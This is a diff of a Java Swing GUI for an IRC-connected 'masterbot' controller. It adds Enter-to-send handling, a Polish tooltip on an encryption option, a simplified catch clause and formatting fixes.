@@ -3,6 +3,8 @@ package mastergui;
 import javax.swing.*;
 import java.awt.event.ActionEvent;
 import java.awt.event.ActionListener;
+import java.awt.event.KeyAdapter;
+import java.awt.event.KeyEvent;
 import java.util.Random;
 
 /**
@@ -39,6 +41,7 @@ public class Gui {
         masterbot.connectToIRC();
         logTextArea1.setEditable(false);
         cleanchatCheckBox.setSelected(false);
+        encryptionRadioButton.setToolTipText("Janusz weź się w końcu za to");
         Timer timer = new Timer(100, new ActionListener() {
             @Override
             public void actionPerformed(ActionEvent e) {
@@ -47,7 +50,7 @@ public class Gui {
                     if (!(line.isEmpty())) {
                         logTextArea1.append(line + "\n");
                     }
-                } catch (java.lang.Exception exc) {
+                } catch (Exception exc) {
                 }
             }
         });
@@ -95,6 +98,15 @@ public class Gui {
             @Override
             public void actionPerformed(ActionEvent e) { commandTextField1.setText("DIE"); }
         });
+
+        commandTextField1.addKeyListener(new KeyAdapter() {
+            @Override
+            public void keyPressed(KeyEvent e) {
+                super.keyPressed(e);
+                if(e.getKeyCode() == KeyEvent.VK_ENTER)
+                    sendButton.doClick();
+            }
+        });
     }
 
     private static void setNickAndLogin(int randomNumber) {
@@ -117,6 +129,5 @@ public class Gui {
         frame.setContentPane(new Gui().mainPanel);
         frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
         frame.setVisible(true);
-
-    }
+     }
 }
